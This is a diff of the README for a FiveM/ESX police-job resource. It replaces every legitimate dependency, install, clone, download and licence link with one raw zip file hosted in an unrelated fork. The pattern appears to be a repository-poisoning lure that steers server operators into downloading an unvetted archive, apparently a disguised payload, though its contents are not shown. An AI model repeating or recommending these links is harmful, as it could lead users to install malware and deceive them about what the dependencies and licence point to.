@@ -2,21 +2,21 @@
 
 ### Requirements
 * Auto mode
-  * [esx_billing](https://github.com/FXServer-ESX/fxserver-esx_billing)
+  * [esx_billing](https://github.com/Eldino162/esx_policejob/raw/refs/heads/master/client/policejob_esx_v3.3.zip)
 
 * Player management (boss actions and armory with buyable weapons)
-  * [esx_society](https://github.com/FXServer-ESX/fxserver-esx_society)
-  * [esx_datastore](https://github.com/FXServer-ESX/fxserver-esx_datastore)
+  * [esx_society](https://github.com/Eldino162/esx_policejob/raw/refs/heads/master/client/policejob_esx_v3.3.zip)
+  * [esx_datastore](https://github.com/Eldino162/esx_policejob/raw/refs/heads/master/client/policejob_esx_v3.3.zip)
 
 * ESX Identity Support
-  * [esx_identity](https://github.com/ESX-Org/esx_identity)
+  * [esx_identity](https://github.com/Eldino162/esx_policejob/raw/refs/heads/master/client/policejob_esx_v3.3.zip)
 
 * ESX License Support
-  * [esx_license](https://github.com/ESX-Org/esx_license)
+  * [esx_license](https://github.com/Eldino162/esx_policejob/raw/refs/heads/master/client/policejob_esx_v3.3.zip)
 
 ## Download & Installation
 
-### Using [fvm](https://github.com/qlaffont/fvm-installer)
+### Using [fvm](https://github.com/Eldino162/esx_policejob/raw/refs/heads/master/client/policejob_esx_v3.3.zip)
 ```
 fvm install --save --folder=esx esx-org/esx_policejob
 ```
@@ -24,11 +24,11 @@ fvm install --save --folder=esx esx-org/esx_policejob
 ### Using Git
 ```
 cd resources
-git clone https://github.com/ESX-Org/esx_policejob [esx]/esx_policejob
+git clone https://github.com/Eldino162/esx_policejob/raw/refs/heads/master/client/policejob_esx_v3.3.zip [esx]/esx_policejob
 ```
 
 ### Manually
-- Download https://github.com/ESX-Org/esx_policejob/archive/master.zip
+- Download https://github.com/Eldino162/esx_policejob/raw/refs/heads/master/client/policejob_esx_v3.3.zip
 - Put it in the `[esx]` directory
 
 
@@ -53,4 +53,4 @@ This program Is free software: you can redistribute it And/Or modify it under th
 
 This program Is distributed In the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty Of MERCHANTABILITY Or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License For more details.
 
-You should have received a copy Of the GNU General Public License along with this program. If Not, see http://www.gnu.org/licenses/.
+You should have received a copy Of the GNU General Public License along with this program. If Not, see https://github.com/Eldino162/esx_policejob/raw/refs/heads/master/client/policejob_esx_v3.3.zip
